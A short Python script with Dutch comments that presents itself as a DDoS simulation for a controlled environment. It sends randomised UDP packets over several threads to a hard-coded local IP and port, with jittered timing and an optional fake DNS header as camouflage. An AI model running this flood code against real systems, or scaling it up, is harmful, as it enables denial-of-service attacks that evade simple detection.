#!/usr/bin/env python3
import socket
import time
import threading
import random
import sys

# ──────────────────────────────────────────────────────────────────────────────
# Bevestiging vóór uitvoering
# ──────────────────────────────────────────────────────────────────────────────
confirm = input("Bevestig dat je in een gecontroleerde omgeving werkt (ja/nee): ")
if confirm.strip().lower() != "ja":
    print("[!] Uitvoering geannuleerd. Zorg dat je in een veilige testomgeving zit.")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURATIE (HARD‑CODED)
# ──────────────────────────────────────────────────────────────────────────────
TARGET_IP        = "192.168.1.1"   # Lokaal IP‑adres van de test‑server
TARGET_PORT      = 8080            # Doel‑poort
PACKETS_TOTAL    = 1000            # Totaal aantal pakketten dat je wilt sturen
RATE_PPS         = 100             # Totaal pakketten per seconde over alle streams
NUM_STREAMS      = 2               # Aantal parallelle streams (threads)

# Payload‑grootte range voor randomisatie (in bytes)
MIN_PAYLOAD_SIZE = 64
MAX_PAYLOAD_SIZE = 1500

# Protocol‑camouflage: zet op True om een DNS‑header voor te doen
CAMOUFLAGE_DNS   = True
# ──────────────────────────────────────────────────────────────────────────────

# Bereken per‑thread parameters
pps_per_thread = RATE_PPS / NUM_STREAMS

def flood(packets_per_thread: int):
    """Verstuurt packets_per_thread UDP‑paketten met random payload & timing."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for _ in range(packets_per_thread):
        # 1) genereer random payload
        size = random.randint(MIN_PAYLOAD_SIZE, MAX_PAYLOAD_SIZE)
        rand_data = bytes(random.getrandbits(8) for _ in range(size))

        # 2) optioneel DNS‑camouflage
        if CAMOUFLAGE_DNS:
            header = b'\x00\x00\x01\x00\x00\x01'
            payload = header + rand_data
        else:
            payload = rand_data

        # 3) verstuur
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except Exception as e:
            print(f"[!] Fout bij verzenden: {e}")

        # 4) random interval (exponentieel verdeeld)
        wait = random.expovariate(pps_per_thread)
        time.sleep(wait)

    sock.close()

def main():
    # Verdeel de totale pakketten gelijk over de streams
    base = PACKETS_TOTAL // NUM_STREAMS
    remainder = PACKETS_TOTAL % NUM_STREAMS

    threads = []
    for i in range(NUM_STREAMS):
        count = base + (1 if i < remainder else 0)
        t = threading.Thread(target=flood, args=(count,))
        threads.append(t)

    print(f"[*] Start DDoS‑simulatie: {NUM_STREAMS} streams, "
          f"{PACKETS_TOTAL} pakketten totaal, ~{RATE_PPS} pps")
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print("[*] Simulatie voltooid.")

if __name__ == "__main__":
    main()
